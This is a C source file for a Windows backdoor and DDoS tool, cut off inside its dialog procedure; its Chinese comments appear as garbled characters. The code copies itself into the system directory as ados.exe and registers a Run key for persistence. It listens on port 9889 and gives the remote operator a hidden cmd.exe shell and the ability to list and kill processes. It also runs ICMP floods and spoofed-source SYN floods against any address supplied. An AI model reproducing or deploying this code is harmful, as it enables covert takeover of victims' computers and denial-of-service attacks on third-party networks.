#include "snakdos.h"


//------------------------------------------------------------------------------------------
//����У��͵��Ӻ��� 
USHORT checksum(USHORT *buffer, int size) 
{ 
 unsigned long cksum=0; 
 while(size >1) 
  { 
    cksum+=*buffer++; 
    size -=sizeof(USHORT); 
  } 
 if(size ) 
  { 
    cksum += *(UCHAR*)buffer; 
  } 
 cksum = (cksum >> 16) + (cksum & 0xffff); 
 cksum += (cksum >>16); 
 return (USHORT)(~cksum); 
} 

//----------------------------------------------------------------------------------------------
//����ѡ����
int CmdSwitch(int i)
{
    switch (i)
	{
      case CMD_HELP:
           send(sAccept, szHelp, sizeof(szHelp) - 1, 0);
           break;
                        
      case CMD_ABOUT:
           send(sAccept, szAbout, sizeof(szAbout) - 1, 0);
           break;

      case CMD_DOS:
		   DosChoice();
		   break;

      case CMD_WIN:
		  WinShell();
		  break;

      case CMD_MESG:
		  Mesg();
		  break;
      case CMD_PROCESS:
		  ProcessRO();
		  break;

      case CMD_EXITT:
		  if (ExitThread() > 0)
		  {
			  send(sAccept,"\r\nShell Exit OK...\r\n",20,0);
			  return 0;
		  }
		  break;
        
	  case CMD_EXITP:
		   send(sAccept, szByeP, sizeof(szByeP) - 1, 0);
		   closesocket(sAccept);
           closesocket(sListen);
           WSACleanup();
		   ExitProcess(0);

      default:
           send(sAccept, szUnknown, sizeof(szUnknown) - 1, 0);

	}
	return 0;
}
//------------------------------------------------------------------------------------------
int cs()
{
	return 0;
}


//--------------------------------------------------------------------------------------------
int ProcessRO()
{
	send(sAccept,szProRO,sizeof(szProRO),0);
	argc = 0;
	GetNetArgv();
	if (argc>1)
	{
		ParamError("Param Many...");
		return 0;
	}
	if (*argv[0] == '1')
	{
		ProcessList();
		return 0;
	}
	else if (*argv[0] == '2')
	{
		KillProcess();
		return 0;
	}
    else ParamError("NO");
	return 0;
}
//-------------------------------------------------------------------------------------------
int ProcessList()
{
	DWORD dwProcessID[1024];
	DWORD cbNeededp;
	DWORD cbNeededm;
	char   szModName[100][1024];
	int iProcessNum;
    int i;
	HMODULE hMods[1024];
	OSVERSIONINFO os;
	char * cPid = (char *)malloc(sizeof(char));
	char * cPba = (char *)malloc(sizeof(char));
	char * hbuf = (char *)malloc(sizeof(char));


    GetVersionEx(&os);
    if (os.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)
	{ 
	   send(sAccept,"\r\nNot suitable for 9X...\r\n",26,0);
	   return 0;
	}
	EnumProcesses(dwProcessID,sizeof(dwProcessID),&cbNeededp);
	iProcessNum = cbNeededp/sizeof(DWORD);
	send(sAccept,"\r\n\t\tPID + File path +Basic Address\r\n",36,0);
	for (i=0;i<iProcessNum;i++)
	{
		hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,FALSE,dwProcessID[i]);
        EnumProcessModules(hProcess,hMods,sizeof(hMods),&cbNeededm);
		GetModuleFileNameEx(hProcess,hMods[0],szModName[i],sizeof(szModName[1024]));
		itoa(i+1,cPid,10);
		send(sAccept,"\r\nProcess:",10,0);
		send(sAccept,cPid,2,0);
		send(sAccept,"\t",1,0);
		itoa((int)dwProcessID[i],cPid,10);
		send(sAccept,"PID:",4,0);
		send(sAccept,cPid,sizeof(cPid),0);
		send(sAccept,"\t",1,0);
		ltoa((long int)hMods[0],cPid,16);
		*cPba = 0;
		if (strlen(cPid) == 8)
		{
			strcat(cPba,cPid);
		}
		if (strlen(cPid) == 7)
		{
			strcat(cPba,"0");
			strcat(cPba,cPid);
		}
		if (strlen(cPid) == 6)
		{
			strcat(cPba,"00");
			strcat(cPba,cPid);
		}
		send(sAccept,"Base address: 0x",16,0);
		send(sAccept,cPba,8,0);
        send(sAccept,"\r\n",2,0);
		send(sAccept,"\t",1,0);
		send(sAccept,szModName[i],sizeof(szModName[1024]),0);
		send(sAccept,"\t",1,0);
		send(sAccept,"\r\n",2,0);
	}
	return 0;
}


//---------------------------------------------------------------------------------------------
int KillProcess()
{
	HANDLE hProcess;
	DWORD dwProcessID;
	HMODULE hMods[1024];
    DWORD cbNeededm;
	char  szModName[1][500] = {0};
	send(sAccept,szKillPro,sizeof(szKillPro),0);
	argc = 0;
	char * hbuf = (char *)malloc(sizeof(char));
	GetNetArgv();
	if (argc > 1)
	{
		ParamError("Param Many...");
		return 0;
	}

	dwProcessID = atol(argv[0]);
    hProcess = OpenProcess(PROCESS_ALL_ACCESS,0,dwProcessID);
	EnumProcessModules(hProcess,hMods,sizeof(hMods),&cbNeededm);
    GetModuleFileNameEx(hProcess,hMods[0],szModName[0],sizeof(szModName[500]));
	send(sAccept,szModName[0],sizeof(szModName[500]),0);
	send(sAccept,"\r\n",2,0);
    if (!TerminateProcess(hProcess,0))
	{
		ParamError("Kill Process Error...");
		return 0;
	}
	send(sAccept,"\r\nKill Process OK....\r\n",23,0);

	return 0;
}
        


//-------------------------------------------------------------------------------------------
int ExitThread()
{
	int i;
	send(sAccept,szExitT,sizeof(szExitT),0);
	send(sAccept,"\r\nInput [1--2]",16,0);
	argc=0;
	GetNetArgv();
	if (argc != 1)
	{
		ParamError("Param Many");
		return 0;
	}
	if (*argv[0] == '1')
	{
		send(sAccept, szByeT, sizeof(szByeT) - 1, 0);
		closesocket(sAccept);
		closesocket(sListen);
		WSACleanup();
		return 1;
	}
	else if (*argv[0] == '2')
	{
		for (i=0;i<icmptnum;i++)
		{
		TerminateThread(hThreadIcmp[i],0);
		}
		send(sAccept,"\r\nIcmp Flood Exit OK...\r\n",25,0);
	}

	return 0;
}

//------------------------------------------------------------------------------------------
//DOS����ѡ����
int DosChoice()
{
	send(sAccept,szDos,sizeof(szDos) - 1,0);
	send(sAccept,szDosChoice,sizeof(szDosChoice) - 1,0);
	send(sAccept,"\r\nInput [1--2]:",15,0);
    argc = 0;
	GetNetArgv();
	if (argc != 1)
	{
		ParamError("Param Many");
		return 0;
	}
	if (*argv[0] == '1')
	{
		IcmpFloodChoice();
	}
	else if (*argv[0] == '2')
	{
		SynFloodChoice();
	}
	else
	{
		ParamError("NO");
	}
	return 0;
}
//------------------------------------------------------------------------------------------

	
//------------------------------------------------------------------------------------------
//������������ĺ���
int GetNetArgv()
{
	 char buf[1024];
	 char * p;
	 char * p3;
	 int  recvlen,buflen,i=1;

	 buflen = 0;
     argv[0] = buf;
	 if (buflen >= sizeof(buf))
	 {
		 send(sAccept,"\r\nargv too long~!\r\n",19,0);
	 }
	 while(1)
	 {
		 recvlen = recv(sAccept,buf + buflen,sizeof(buf) - buflen,0);
		 buflen+=recvlen;
		 for(p3=buf;p3<buf+buflen;p3++)
		 {
			 if (*p3 == '\n')
			 {
				 for(p=buf;p<buf+buflen;p++)
				 {
					 if (*p == ' ')
					 {
						 *p = '\0';
						 argv[i] = ++p;
                         p--;
						 argc++;
						 i++;
					 }
					 if (*p == '\n')
					 {
						 *p = '\0';
						 argc++;
					 }
				 }
				 return 0;
			 }
		 }
		 
	 }
}
//-------------------------------------------------------------------------------------------
//������:�õ������в���
//�õ������в����ĺ������ڵ��ôκ���ʱӦ���ݸ���һ��ָ�����в����ַ�����ָ�룬���ָ��Ӧ����ͨ��
//GetCommandLine�õ��ģ������������ַ���������˴�EXE�ļ��������Ҳ�����'\0'��β�ģ�������ȡ������
//������Ӧ��׷��һ�����������ļ��������������������
int GetCmdArgv(PCHAR pCmdlin)
{
	char * p;
	char * cmdlinebuf;
	int i=0;
	     //char * a = (char *)malloc(sizeof(char));
	     //char * b = (char *)malloc(sizeof(char));
	     //int l,e;


	    //MessageBox(NULL,pCmdlin,"����GetCmdArgv",0);
	//��ʼ����������������
	Cargc = 0;
	//������ָ��CMD�����ַ�����ʼ��
	cmdlinebuf = pCmdlin;
	    //l = strlen(pCmdlin);
	    //itoa(l,b,10);
        //MessageBox(NULL,b,"strlen(pCmdlin)",0);
	//��ͷ��������CMD�����ַ���
	for (p=pCmdlin;p<pCmdlin+strlen(pCmdlin);p++)
	{
		//MessageBox(NULL,"for (p=pCmdlin;p>pCmdlin+strlen(pCmdlin);p++)",p,0);
		//��ǰ�ַ�Ϊ�ո�ͣ�´���
		if (*p == ' ')
		{
			//��ǰ�ַ�����
			*p = '\0';
			//��ʼ�������в���ָ��
			Cargv[i] = (char *)malloc(sizeof(char));
			//�ӻ������õ��ո�ǰ��һ������
			strcpy(Cargv[i],cmdlinebuf);
			//������ָ����һ������
			cmdlinebuf = ++p;
			//CMD����������1
            Cargc++;
			//ָ���¿ո�
			p--;
			//��Ϊ�����е�������'\0'���Զ���������֪��Ϊʲô��������Ҫ��ؿո�
			*p = ' ';
			i++;
		}
	}
	//���ڽ�βû���κα�ʾ������׷��һ������
	Cargv[i] = (char *)malloc(sizeof(char));
	strcpy(Cargv[i],cmdlinebuf);
	i++;
	for (i;i<10;i++)
	{
		Cargv[i] = (char *)malloc(sizeof(char));
	}
	//
    //for (e=0;e<Cargc+1;e++)
	//{
	//MessageBox(NULL,Cargv[e],"��N��������",0);
	//}
	//itoa(Cargc,a,10);
	//MessageBox(NULL,a,"��������;",0);
	return 0;
}

//--------------------------------------------------------------------------------------------
//������Ϣ���������
int Mesg()
{
	int recvlen,Mesglen;
	char Mesgbuf[1024];
	char * p;
	DWORD dt;

	send(sAccept,szMesg,sizeof(szMesg) - 1,0);
	send(sAccept,"\r\n������һ����Ϣ~~\r\n\r\n��Ϣ:",27,0);
	Mesglen = 0;
	while(1)
	{
		if (Mesglen >= sizeof(Mesgbuf))
		{
			send(sAccept,"\r\nMesg Too long\r\n",17,0);
		}
		recvlen = recv(sAccept,Mesgbuf + Mesglen,sizeof(Mesgbuf) - Mesglen,0);
        Mesglen+=recvlen;
		for(p = Mesgbuf;p < Mesgbuf + Mesglen;p++)
		{
			if((*p=='\r') || (*p=='\n'))
			{
				*p = '\0';
				CreateThread(NULL,0,MesgThread,&Mesgbuf,0,&dt);
				send(sAccept,"\r\nSend  OK ...\r\n",16,0);
				Mesglen = 0;
				return 0;
			}
		}
	}
	return 0;
}


//=============================================================================================
//������Ϣ�̺߳���
DWORD WINAPI MesgThread(PVOID pwParam)
{

	MessageBox(NULL,(const char *)pwParam,"��Ϣ",0);
	return 0;
}
//--------------------------------------------------------------------------------------------
//��������
int ParamError(char ErrorCode[1024])
{

	send(sAccept,"\r\nERROR...\r\n",12,0);
	if (ErrorCode[0] =='N')
	{
		send(sAccept,"\r\nParam Error...\r\n",18,0);
	}
	else
	{
	send(sAccept,"\r\n",2,0);
    send(sAccept,ErrorCode,20,0);
	send(sAccept,"\r\n",2,0);
	}

	return 0;
}

//----------------------------------------------------------------------------------------------
//ͨ���ܵ�����ʵ��Shell��
int WinShell()
{
 SECURITY_ATTRIBUTES sa;
 STARTUPINFO si;
 unsigned long lBytesRead;
 HANDLE hReadPipe1,hWritePipe1,hReadPipe2,hWritePipe2;
 PROCESS_INFORMATION ProcessInformation;
 int  ret;
 char Buff[1024];
 char cmdLine[] = "cmd.exe";


send(sAccept,szWin,sizeof(szWin) - 1,0);
// ���Ĵ��뿪ʼ
//���SECURITY_ATTRIBUTES�ṹ���������ܵ���

sa.nLength=sizeof(sa);
sa.lpSecurityDescriptor=0;
sa.bInheritHandle=true;
    

ret=CreatePipe(&hReadPipe1,&hWritePipe1,&sa,0);
ret=CreatePipe(&hReadPipe2,&hWritePipe2,&sa,0);
                  

//���STARTUPINFO�ṹ��������CMD���̣����������CMD���̴������½�������̳�CMD�����ԡ�
//���޴��壬��׼����������������ܵ�����
ZeroMemory(&si,sizeof(si));
//������������WshowWindow�ֶ���Ч
si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
//���޴�����ʽ����
si.wShowWindow = SW_HIDE;
//�滻��׼����������Ϊ�ܵ���д����������ǹؼ�ͨ���滻�˱�׼����������Ϊͨ���������
//���԰�CMD��
si.hStdInput = hReadPipe2;
si.hStdOutput = si.hStdError = hWritePipe1;
//����CMD����
ret=CreateProcess(NULL,cmdLine,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation);
//����һ������ѭ�����ܿͻ��˵�����Ȼ��ת����CMDִ�У���ִ�н��������ͻ���
while(1) 
{
	//���ͨ���Ƿ�������������������������Ȼ�󷢸��ͻ������û������ͻ������룬д��ܵ���
	ret=PeekNamedPipe(hReadPipe1,Buff,1024,&lBytesRead,0,0);
	//lBytesReadΪ�ܵ����ܵ��ֽ��������Կ��Ը������жϹܵ��Ƿ�������                
    if(lBytesRead) 
	{
		//���������lBytesRead���ֽڵ�������
		ret=ReadFile(hReadPipe1,Buff,lBytesRead,&lBytesRead,0);
		                
		if(!ret)
		{
			break;
		}
		ret=send(sAccept,Buff,lBytesRead,0);
		if (lBytesRead<10)
		{
			if (strcmp(Buff,"exit")>0)
			{
		    CloseHandle(hReadPipe1);
			CloseHandle(hReadPipe2);
			CloseHandle(hWritePipe1);
	        CloseHandle(hWritePipe2);
		    return 0;
			}
		}
		if(ret<=0)
			break;
	}
	else
	{
		//���û���������ж���ˣ��ȴ����ܿͻ�������
		lBytesRead=recv(sAccept,Buff,1024,0);
		                
		if(lBytesRead<=0)
		    break;
		//��ܵ�дlBytesRead���ֽڵ�����
		ret=WriteFile(hWritePipe2,Buff,lBytesRead,&lBytesRead,0);
		Sleep(200);
		           
		if(!ret)
			break;
	}
}

return 0; 
}


//----------------------------------------------------------------------------------------------
//ICMP Flood������������
int IcmpFloodChoice()
{
    int i;
	int n;

	send(sAccept,"\r\nTO:",5,0);
	argc = 0;
	GetNetArgv();
	if (argc>2)
	{
		ParamError("Param Many");
		return 0;
	}
	strcpy(cip,argv[0]);
	send(sAccept,"\r\nICMP Flood to ",16,0);
    send(sAccept,cip,sizeof(cip),0);
	send(sAccept,"\r\n",2,0);
	if (argc != 2)
	{
		icmptnum = 30;
		send(sAccept,"\r\nThread is 30\r\n",16,0);
	}
	else
	{
		n = atoi(argv[1]);
		if (n < 0 || n > 200) 
		{
			icmptnum = 30;
			send(sAccept,"\r\nThread is 30\r\n",16,0);
		}
		icmptnum = n;
     	send(sAccept,"\r\nThread is ",12,0);
        send(sAccept,argv[1],3,0);
    	send(sAccept,"\r\n",2,0);
	}

	for(i=0;i<icmptnum;i++)
	{
		hThreadIcmp[i] = CreateThread(NULL,0,ThreadDosSend,&pvParam,0,&dwThreadID);
	}
	send(sAccept,"\r\nICMP Flood Yes!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\r\n",53,0);
	
	return 0;
}

	//i = recv(sAccept, szBuffer + iLen, sizeof(szBuffer) - iLen, 0);
	

//----------------------------------------------------------------------------------------------
//�ѵ�ǰ���̼�Ϊ����ֻ��9X����
int RegService()
{
	 int (CALLBACK *RegisterServiceProcess)(DWORD,DWORD); 
     HINSTANCE dll=LoadLibrary("KERNEL32.DLL"); //װ��KERNEL32.DLL 
     RegisterServiceProcess=(int(CALLBACK *)(DWORD,DWORD))GetProcAddress(dll,"RegisterServiceProcess"); 
        //�ҵ�RegisterServiceProcess����� 
     RegisterServiceProcess(NULL,1); //ע����� 
     FreeLibrary(dll); 
	 return 0;
}

//----------------------------------------------------------------------------------------
//���Լ��ӵ�ע�����������
int RegBoot()
{
	
HKEY hkey; 
unsigned long k; 
char pname[256];
char mename[256];

GetModuleFileName(NULL,mename,sizeof(mename));
GetSystemDirectoryA(pname,256);
strcat(pname,"\\ados.exe");
CopyFile(mename,pname,true);
k=REG_OPENED_EXISTING_KEY; 
RegCreateKeyEx(HKEY_LOCAL_MACHINE, 
"SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN\\", 
0L, 
NULL, 
REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS|KEY_SET_VALUE, 
NULL, 
&hkey,&k); 
RegSetValueEx(hkey, 
"DosService", 
0, 
REG_SZ, 
(const unsigned char *)pname, 
30); 
	return 0;
}

//==========================================================================================
//ICMP Flood��������
DWORD WINAPI ThreadDosSend(PVOID pvParam)
{
 int datasize,ErrorCode,flag; 
 int TimeOut=2000, SendSEQ=0, PacketSize=6000,type=8,code=8,counter=0; //Ĭ���������� 
 char SendBuf[65535]={0}; //���� 
 WSADATA wsaData; 
 SOCKET SockRaw=(SOCKET)NULL; //ԭʼ�׽���
 struct sockaddr_in DestAddr; 
 ICMP_HEADER icmp_header; //ICMPͷ
 char DestIp[20]; //Ŀ��IP 

 strcpy(DestIp,cip); 
 //MessageBox(NULL,DestIp,"strcpy(DestIp,cip);",0); 
 //��ʼ��SOCK_RAW 
 if((ErrorCode=WSAStartup(MAKEWORD(2,2),&wsaData))!=0) 
  { 
    fprintf(stderr,"WSAStartup failed: %d\n",ErrorCode); 
    exit(0); 
  } 

 if((SockRaw=WSASocket(AF_INET,SOCK_RAW,IPPROTO_ICMP,NULL,0,WSA_FLAG_OVERLAPPED))==INVALID_SOCKET) 
  { 
    exit(0); 
  } 
 flag=TRUE; 

{ 

//���÷��ͳ�ʱ 
 ErrorCode=setsockopt(SockRaw,SOL_SOCKET,SO_SNDTIMEO,(char*)&TimeOut,sizeof(TimeOut)); 
 if (ErrorCode==SOCKET_ERROR) 
  { 
    exit(1); 
 } 

//��Ҫ���뿪ʼ 
 memset(&DestAddr,0,sizeof(DestAddr)); 
 DestAddr.sin_family=AF_INET; 
 DestAddr.sin_addr.s_addr=inet_addr(DestIp); //���Socket�ṹ 
 //MessageBox(NULL,DestIp,"destip",0);
 //MessageBox(NULL,(const char *)inet_addr(DestIp),"inet_IP",0);
//���ICMP�ײ� 
 icmp_header.i_type = type; 
 icmp_header.i_code = code; 
 icmp_header.i_cksum = 0; //У�����0 
 icmp_header.i_id = 2; 
 icmp_header.timestamp = GetTickCount(); //ʱ��� 
 icmp_header.i_seq=999; 
 memcpy(SendBuf, &icmp_header, sizeof(icmp_header)); //���ICMP���ĺ�ͷ�� 
 memset(SendBuf+sizeof(icmp_header), 'E', PacketSize); //��E���ICMP���� 
 icmp_header.i_cksum = checksum((USHORT *)SendBuf, sizeof(icmp_header)+PacketSize); //����У��� 

 datasize=sizeof(icmp_header)+PacketSize; //�����������ݰ���С 
//��ʼ���� 
while(1){ 

  for(counter=0;counter<1024;counter++){ //ѭ������1024�����ݰ�Ϊһ�� 
//����ICMP���� 
    ErrorCode=sendto(SockRaw,SendBuf,datasize,0,(struct sockaddr*)&DestAddr,sizeof(DestAddr)); 
    if (ErrorCode==SOCKET_ERROR) 
	{
		//MessageBox(NULL,"Dos is sendto error...","error",0);
		exit(0); 
	}
  } 
} 
} 

 { 
  if (SockRaw != INVALID_SOCKET) closesocket(SockRaw); 
  WSACleanup(); 
 } 


	return 0;
}
//============================================================================================
//����һ�������߳�
DWORD WINAPI TcpListenFun(PVOID pvParam)
{
    int i;
    int iLen;
    char * p;
    char szBuffer[1024];
  
    WSADATA WsaData;
    struct sockaddr_in saiBind;
    struct sockaddr_in saiDest;    

    // ��ʼ�� Socket
    if ((i = WSAStartup(MAKEWORD(2, 2), &WsaData)) != 0)
    {
        //MessageBox(NULL,"WSAStartup Error...","error",0);
        return 1;
    }

    // ���� Socket ���
    sListen = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_IP, NULL, 0, WSA_FLAG_OVERLAPPED);
    if (sListen == INVALID_SOCKET)
    {
        //MessageBox(NULL,"WSASocket ERROR..","ERROR",0);
        WSACleanup();
        return 2;
    }

    // ���Socket�ṹ 
    RtlZeroMemory(&saiBind, sizeof(saiBind));
    saiBind.sin_family = AF_INET;
    saiBind.sin_addr.s_addr = htonl(INADDR_ANY);
    saiBind.sin_port = htons(9889);

    // ��
    if (bind(sListen, (struct sockaddr *) &saiBind, sizeof(saiBind)) < 0)
    {
        //MessageBox(NULL,"Bind ERROR...","ERROR",0);
        WSACleanup();
        return 3;
    }

    // ����
    if (listen(sListen, 1) == SOCKET_ERROR)
    {
        //MessageBox(NULL,"Listen ERROR...","ERROR",0);
        WSACleanup();
        return 4;
    }

    // �����ɹ�
    //MessageBox(NULL,"Listen good","good",0);

    while (1)
    {
        // �ȴ�����
        i = sizeof(saiDest);
        sAccept = accept(sListen, (struct sockaddr *) &saiDest, &i);
        if (sAccept == INVALID_SOCKET)
        {
            //MessageBox(NULL,"Accept ERROR","ERROR",0);
            WSACleanup();
            return 5;
        }

        // ���ӳɹ������ͻ�ӭ��Ϣ
        send(sAccept, szWelcome, sizeof(szWelcome) - 1, 0);
        send(sAccept, "CMD>", 4, 0);    

        // �ȴ�����
        iLen = 0;
        while (TRUE)
        {
            if (iLen >= sizeof(szBuffer))
            {
                // ��ջ����������ϣ�
                iLen = 0;
                send(sAccept, "\r\nToo long!\r\n", 13, 0);                
            }
            // ��������
            i = recv(sAccept, szBuffer + iLen, sizeof(szBuffer) - iLen, 0);
            if (i <= 0)
            {
                //MessageBox(NULL,"RECV ERROR","ERROR",0);
                WSACleanup();
                return 6;
            }
            iLen += i;
            
            // �����س�����
            for (p = szBuffer; p < szBuffer + iLen; p++)
            {
                if ((*p == '\n') || *p == '\r')
                {
                    // �ӻ��д��ض�
                    *p = '\0';

                    // ��������
                    for (i = 0; i < sizeof(szCommand) / sizeof(szCommand[0]); i++)
                    {
                        if (lstrcmpi(szCommand[i], szBuffer) == 0)
                            break;
                    }

                    if (CmdSwitch(i)>0)
						return 0;

                    // ��ջ����������ϣ�
                    iLen = 0;
                    send(sAccept, "CMD>", 4, 0);
                    break;
                }
            }            
        }
    }
}


//--------------------------------------------------------------------------------------
int CmdIcmpDos()
{
	int i;
	int tNum;

	strcpy(cip,Cargv[3]);
	tNum = atoi(Cargv[4]);
	if (tNum < 1 || tNum > 200)
		tNum = 30;
	for (i=0;i<tNum;i++)
	{
		CreateThread(NULL,0,ThreadDosSend,&pvParam,0,&dwThreadID);
	}
	return 0;
}

//-----------------------------------------------------------------------------------------
int DlgMain(HINSTANCE hPrevInstance,LPSTR lpCmdLine,int iCmdShow)
{
	ClassXP(NULL,TRUE);
	DialogBoxParam(hPrevInstance, MAKEINTRESOURCE(IDD_MAIN),NULL, Dlg_Proc, (long)lpCmdLine);
	return 0;

}
//---------------------------------------------------------------------------------------------

int SynFloodChoice()
{
	int Tnum;
	int i;


	send(sAccept,"\r\nTo:",5,0);
	argc = 0;
	GetNetArgv();
	if (argc < 1 || argc >3)
	{
		ParamError("NO");
		return 0;
	}
	if (argc == 1)
	{
		strcpy(cip,argv[0]);
		port = 139;
		Tnum = 10;
	}
	if (argc == 2)
	{
		strcpy(cip,argv[0]);
		port = atoi(argv[1]);
		Tnum = 10;
	}
	if (argc == 3)
	{
		strcpy(cip,argv[0]);
		port = atoi(argv[1]);
		Tnum = atoi(argv[2]);
	}
    if (Tnum > 200)
	{
		argv[2] = "10";
		Tnum = 10;
	}
	send(sAccept,"\r\nSYN Flood To ",15,0);
	send(sAccept,cip,sizeof(cip),0);
	send(sAccept,":",1,0);
	send(sAccept,argv[1],3,0);
    send(sAccept,"\r\nThread is ",12,0);
	send(sAccept,argv[2],3,0);
	send(sAccept,"\r\n",2,0);

	for (i=0;i<Tnum;i++)
	{
		hThreadSyn[i] = CreateThread(NULL,0,ThreadSynFlood,&pvParam,0,&dwThreadID);
	}
	
	send(sAccept,"\r\nICMP Flood Yes!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\r\n",53,0);
	
	return 0;   

}
//---------------------------------------------------------------------------------------
DWORD WINAPI ThreadSynFlood(PVOID pvParam)
{
	int datasize,counter,flag,FakeIpNet,FakeIpHost;
	int TimeOut=2000,SendSEQ=0,i=0; 
	char SendBuf[128]={0}; 
	char RecvBuf[65535]={0}; 
	WSADATA wsaData; 
	SOCKET SockRaw=(SOCKET)NULL; 
	struct sockaddr_in DestAddr; 
	IP_HEADER ip_header; 

	TCP_HEADER tcp_header; 

	WSAStartup(MAKEWORD(2,1),&wsaData);
	SockRaw=WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED); 
	flag=TRUE; //����IP_HDRINCL���Լ����IP�ײ� 

	setsockopt(SockRaw,IPPROTO_IP,IP_HDRINCL,(char *)&flag,sizeof(int)); 

	__try{ //���÷��ͳ�ʱ 
		setsockopt(SockRaw,SOL_SOCKET,SO_SNDTIMEO,(char*)&TimeOut,sizeof(TimeOut)); 
		memset(&DestAddr,0,sizeof(DestAddr)); 
		DestAddr.sin_family=AF_INET; 
		DestAddr.sin_addr.s_addr=inet_addr(cip); //Ŀ��IP
		FakeIpNet=inet_addr(FAKE_IP); //ԴIP
		FakeIpHost=ntohl(FakeIpNet); //���IP�ײ� 
		ip_header.h_verlen=(4<<4 | sizeof(ip_header)/sizeof(unsigned long)); //����λIP�汾�ţ�����λ�ײ����� 
		ip_header.total_len=htons(sizeof(IP_HEADER)+sizeof(TCP_HEADER)); //16λ�ܳ��ȣ��ֽڣ� 
		ip_header.ident=1; //16λ��ʶ 
		ip_header.frag_and_flags=0; //3λ��־λ 
		ip_header.ttl=128; //8λ����ʱ��TTL 
		ip_header.proto=IPPROTO_TCP; //8λЭ��(TCP,UDP��) 
		ip_header.checksum=0; //16λIP�ײ�У��� 
		ip_header.sourceIP=htonl(FakeIpHost+SendSEQ); //32λԴIP��ַ 
		ip_header.destIP=inet_addr(cip); //32λĿ��IP��ַ 
		//���TCP�ײ� 
		tcp_header.th_sport=htons(1122); //Դ�˿ں�
		tcp_header.th_dport=htons(port); //Ŀ�Ķ˿ں� 
		tcp_header.th_seq=htonl(SEQ+SendSEQ); //SYN���к� 
		tcp_header.th_ack=0; //ACK���к���Ϊ0 
		tcp_header.th_lenres=(sizeof(TCP_HEADER)/4<<4|0); //TCP���Ⱥͱ���λ 
		tcp_header.th_flag=2; //SYN ��־ 
		tcp_header.th_win=htons(16384); //���ڴ�С 
		tcp_header.th_urp=0; //ƫ�� 
		tcp_header.th_sum=0; //У��� //���TCPα�ײ������ڼ���У��ͣ������������ͣ� 
		psd_header.saddr=ip_header.sourceIP; //Դ��ַ 
		psd_header.daddr=ip_header.destIP; //Ŀ�ĵ�ַ 
		psd_header.mbz=0; 
		psd_header.ptcl=IPPROTO_TCP; //Э������ 
		psd_header.tcpl=htons(sizeof(tcp_header)); //TCP�ײ����� //ÿ����10,24���������һ����ʾ�� 

		while(1)
		{
			Sleep(100);
			for(counter=0;counter<1024;counter++){ 
				if(SendSEQ++==65536) SendSEQ=1; //���к�ѭ�� 
				//����IP�ײ� 
				ip_header.checksum=0; //16λIP�ײ�У��� 
				ip_header.sourceIP=htonl(FakeIpHost+SendSEQ); //32λԴIP��ַ //����TCP�ײ� 
				tcp_header.th_seq=htonl(SEQ+SendSEQ); //SYN���к� 
				tcp_header.th_sum=0; //У��� 
				//����TCP Pseudo Header 
				psd_header.saddr=ip_header.sourceIP; //����TCPУ��ͣ�����У���ʱ��Ҫ����TCP pseudo header 
				memcpy(SendBuf,&psd_header,sizeof(psd_header)); 
				memcpy(SendBuf+sizeof(psd_header),&tcp_header,sizeof(tcp_header)); 
				tcp_header.th_sum=checksum((USHORT *)SendBuf,sizeof(psd_header)+sizeof(tcp_header)); //����IPУ��� 
				memcpy(SendBuf,&ip_header,sizeof(ip_header)); 
				memcpy(SendBuf+sizeof(ip_header),&tcp_header,sizeof(tcp_header)); 
				memset(SendBuf+sizeof(ip_header)+sizeof(tcp_header),0,4); 
				datasize=sizeof(ip_header)+sizeof(tcp_header); 
				ip_header.checksum=checksum((USHORT *)SendBuf,datasize); //��䷢�ͻ����� 
				memcpy(SendBuf,&ip_header,sizeof(ip_header)); //����TCP���� 
				sendto(SockRaw, 
					SendBuf, 
					datasize, 
					0, 
					(struct sockaddr*) &DestAddr, 
					sizeof(DestAddr)); 
			}
		} 
}
__finally { 

if (SockRaw != INVALID_SOCKET) closesocket(SockRaw); 

WSACleanup(); 

} 

return 0; 

} 
//---------------------------------------------------------------------------------------
//������
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	PVOID pvParam1;
	DWORD dwThreadID1;
	PCHAR PCMD;
	OSVERSIONINFO os;
    shInstance = hInstance;


	RegBoot();
	GetVersionEx(&os);
	if (os.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)
	{
		RegService();
	}
	PCMD = GetCommandLine();
	GetCmdArgv(PCMD);
	if (Cargc > 0)
	{
        switch (*Cargv[1])
		{
		case 'D':
		case 'd':
			if (*Cargv[2] == 'i' || *Cargv[2] == 'I' )
				CmdIcmpDos();
			else 
			{
				MessageBox(NULL,"Dos Param Error...","Error",0);
				return 0;
			}
			break;

        case 'G': 
        case 'g':
			DlgMain(hPrevInstance,lpCmdLine,nCmdShow);
			return 0;

		case 'T':
        case 't':
			MessageBox(NULL,"Server Tool Mod is Error...","Error",0);
			return 0;
         
        default:
			MessageBox(NULL,"Param is Error...","Error",0);
			return 0;
		}

	}
    else
	{
		CreateThread(NULL,0,TcpListenFun,&pvParam1,0,&dwThreadID1);
	}
	while(1)
	{
		Sleep(100);
	}
	return 0;
	
}
//--------------------------------------------------------------------------------------------
int CALLBACK Dlg_Proc (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	int i;
	int iSynPort;
	int iSynThread;
	int iIcmpThread;

	char * cSynIp = (char *)malloc(sizeof(char));
	char * cSynPort = (char *)malloc(sizeof(char));
	char * cSynThread = (char *)malloc(sizeof(char));
	char * cIcmpIp = (char *)malloc(sizeof(char));
	char * cIcmpThread = (char *)malloc(sizeof(char));
	char * ButText = (char *)malloc(sizeof(char));


	switch (message)
	{
	case WM_COMMAND:
		switch (wParam)
		{
        case IDC_SYNSEND:
			GetDlgItemText(hwnd,IDC_SYNIP,cSynIp,16);
			GetDlgItemText(hwnd,IDC_SYNPORT,cSynPort,5);
			GetDlgItemText(hwnd,IDC_SYNTHREAD,cSynThread,3);
